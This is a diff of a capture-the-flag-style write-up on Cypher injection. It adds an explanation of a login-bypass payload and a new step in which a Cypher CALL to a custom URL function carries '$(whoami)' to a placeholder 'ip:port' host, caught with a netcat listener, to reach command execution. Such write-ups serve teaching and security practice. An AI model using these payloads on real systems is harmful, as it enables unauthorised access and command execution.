@@ -28,11 +28,31 @@ After trying some Cypher injection payloads we can see that there is a huge erro
   "password": "test"
 }
 ```
-
+### How this works?
 This payload returns the hash of the string "test", which is then used for comparison against the user-provided password hash instead of actual admins hash.
+
+### Tip
+You dont have to use burpsuite. You can just paste the following payload into login form.
 
 ![Demo page](img/Demopage.png)
 
-## Step 5: Cypher injection 2
+## Step 5: Crafting SSRF payload with Cypher Injection
+
+```bash
+CALL custom.getUrlStatusCode("http://ip:port/?c=$(whoami)")
+```
+
+### How this works?
+This payload uses custom function that tries to return a status code, but also executes command given at the end.
+
+### How to use?
+
+Set up netcat listener on your port.
+
+```bash
+nc -lnvp 4444
+```
+Enter the payload and voilà, you just got yourself an RCE.
+
 
 
